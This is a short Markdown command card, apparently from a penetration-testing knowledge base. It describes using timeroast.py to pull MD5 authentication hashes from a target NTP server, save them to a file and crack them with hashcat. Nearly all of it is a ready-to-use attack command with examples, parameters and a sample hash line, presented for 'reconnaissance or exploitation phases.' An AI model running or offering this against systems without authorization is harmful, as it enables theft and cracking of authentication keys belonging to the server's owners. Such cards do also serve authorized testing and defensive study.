---
type: command
executor: bash
data: sudo ./timeroast.py $_TARGET_IP | tee ntp-hashes.txt
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - ntp
  - extraction
  - hashes
verified: true
validated: true
---

# timeroast-extract-ntp-hashes

## Command

```bash
sudo ./timeroast.py $_TARGET_IP | tee ntp-hashes.txt
```

## Description

This command uses the timeroast.py script to query a target NTP server for MD5 authentication challenges, extracting hashes that can be cracked to recover the symmetric key. It pipes the output to a file for further processing. Use this during reconnaissance or exploitation phases when targeting time synchronization services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address of the target NTP server (UDP/123) | Yes |
| sudo | Elevates privileges for raw socket access | Yes |
| tee | Saves output to ntp-hashes.txt while displaying | No (but recommended) |

## Examples

### Basic Usage

```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
```

### With Silent Output

```bash
sudo ./timeroast.py 10.0.0.42 > ntp-hashes.txt 2>/dev/null
```

## Expected Output

Captured hashes in Hashcat-compatible format, e.g.:

ntp-md5::10.0.0.42:123:5f4dcc3b5aa765d61d8327deb882cf99

If no output, the server may not use MD5 auth or access is restricted.

## Related

- [[procedures/Timeroasting-NTP-Servers-to-Crack-Authentication-Keys]]
- [[commands/hashcat-crack-ntp-md5]]
